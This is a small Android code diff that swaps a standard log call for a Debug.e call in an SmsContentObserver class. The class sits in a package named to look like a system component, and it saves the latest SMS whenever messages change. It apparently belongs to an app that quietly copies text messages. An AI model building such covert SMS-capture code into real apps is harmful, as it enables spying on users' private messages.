@@ -3,7 +3,6 @@ package com.android.system.controled;
 import android.content.Context;
 import android.database.ContentObserver;
 import android.os.Handler;
-import android.util.Log;
 
 import com.android.system.controled.util.SmsSaveOutUtil;
 
@@ -21,7 +20,7 @@ public class SmsContentObserver extends ContentObserver {
 		// TODO Auto-generated method stub
 		super.onChange(selfChange);
 
-		Log.e("SmsContentObserver", "ON CHANGED !!!!!");
+		Debug.e("SmsContentObserver", "ON CHANGED !!!!!");
 		SmsSaveOutUtil so = new SmsSaveOutUtil(context);
 		so.saveLastSms();
 	}
